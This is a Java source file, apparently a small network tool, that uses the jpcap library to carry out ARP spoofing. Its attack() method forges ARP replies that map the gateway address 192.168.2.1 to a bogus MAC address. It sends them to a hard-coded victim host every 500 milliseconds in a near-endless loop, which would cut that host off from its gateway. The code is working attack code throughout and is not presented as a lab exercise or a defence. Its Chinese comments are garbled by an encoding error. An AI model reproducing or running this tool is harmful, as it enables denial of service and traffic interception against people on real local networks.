import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;
import jpcap.packet.Packet;
import java.io.IOException;
import java.net.InetAddress;
import java.util.Arrays;


public class ArpClient {


    private static NetworkInterface device = JpcapCaptor.getDeviceList()[0];

    /**
     * ����IP����ARP��
     */
    private static final String LOCAL_HOST_IP = "192.168.2.28";


     //ͨ��IP��ַ��ȡMAC��ַ��

    private static byte[] getMacByIP(String ip) throws IOException {
        //�������豸
        JpcapCaptor jpcapCaptor = JpcapCaptor.openDevice(device, 2000, false, 3000);
        //������JpcapSender���������ͱ���
        JpcapSender jpcapSender = jpcapCaptor.getJpcapSenderInstance();


        InetAddress senderIP = InetAddress.getByName(LOCAL_HOST_IP);
        //Ŀ��������IP��ַ
        InetAddress targetIP = InetAddress.getByName(ip);

        ARPPacket arp = new ARPPacket();
        //Ӳ������ 1 ������̫��
        arp.hardtype = ARPPacket.HARDTYPE_ETHER;
        //Э������ ipЭ��
        arp.prototype = ARPPacket.PROTOTYPE_IP;
        //Ӳ����ַ����
        arp.hlen = 6;
        //Э���ַ����
        arp.plen = 4;
        //Opcode �������� request
        arp.operation = ARPPacket.ARP_REQUEST;

        //ARP���ķ��Ͷ���̫����ַ
        arp.sender_hardaddr = device.mac_address;
        //���Ͷ�IP��ַ
        arp.sender_protoaddr = senderIP.getAddress();

        byte[] broadcast = new byte[]{(byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255};
        //����Ŀ�Ķ˵���̫����ַΪ�㲥��ַ
        arp.target_hardaddr = broadcast;
        //Ŀ�Ķ�IP��ַ
        arp.target_protoaddr = targetIP.getAddress();

        //�����̫���ײ�
        EthernetPacket ether = new EthernetPacket();
        ether.dst_mac = broadcast;
        ether.src_mac = device.mac_address;
        //�ϲ�Э��
        ether.frametype = EthernetPacket.ETHERTYPE_ARP;
        //��arp��������̫��ͷ��
        arp.datalink = ether;


        while (true) {
            jpcapSender.sendPacket(arp);
            Packet packet = jpcapCaptor.getPacket();
            if (packet instanceof ARPPacket) {
                ARPPacket arpPacket = (ARPPacket) packet;
                if (Arrays.equals(arpPacket.target_protoaddr, senderIP.getAddress())) {
                    System.out.println("success mac=" + Arrays.toString(arpPacket.sender_hardaddr));
                    return arpPacket.sender_hardaddr;
                }
            }
            try {
                Thread.sleep(200);
            } catch (InterruptedException ignore) {
            }
        }
    }


    private static byte[] stomac(String macAddr) {
        byte[] mac = new byte[]{(byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00};
        String[] temp = macAddr.split("-");
        for (int x = 0; x < temp.length; x++) {
            mac[x] = (byte) ((Integer.parseInt(temp[x], 16)) & 0xff);
        }
        return mac;
    }


    private static void attack(String ip, int time) throws InterruptedException, IOException {
        JpcapCaptor jpcap = JpcapCaptor.openDevice(device, 65535, false, 3000);
        jpcap.setFilter("arp", true);
        JpcapSender sender = JpcapSender.openDevice(device);

        ARPPacket arp = new ARPPacket();
        //Ӳ������
        arp.hardtype = ARPPacket.HARDTYPE_ETHER;
        //Э������
        arp.prototype = ARPPacket.PROTOTYPE_IP;
        //ָ����ARPӦ�����
        arp.operation = ARPPacket.ARP_REPLY;
        arp.hlen = 6;
        arp.plen = 4;

        byte[] srcmac = stomac("00-00-00-FE-C1-23");
        arp.sender_hardaddr = srcmac;
        //��������
        arp.sender_protoaddr = InetAddress.getByName("192.168.2.1").getAddress();

        arp.target_hardaddr = getMacByIP(ip);
        arp.target_protoaddr = InetAddress.getByName(ip).getAddress();

        //����������·���֡
        EthernetPacket ether = new EthernetPacket();
        ether.frametype = EthernetPacket.ETHERTYPE_ARP;
        ether.src_mac = srcmac;
        ether.dst_mac = getMacByIP(ip);
        arp.datalink = ether;

        int i = 0;
        while (true) {
            sender.sendPacket(arp);
            System.out.println("Arp send success");
            Thread.sleep(time);
            i++;
            if (i > 1000000000) {
                break;
            }
        }
    }

    public static void main(String[] args) throws InterruptedException, IOException {
        System.out.println(System.getProperty("java.library.path"));
        attack("192.168.2.31", 500);
    }
}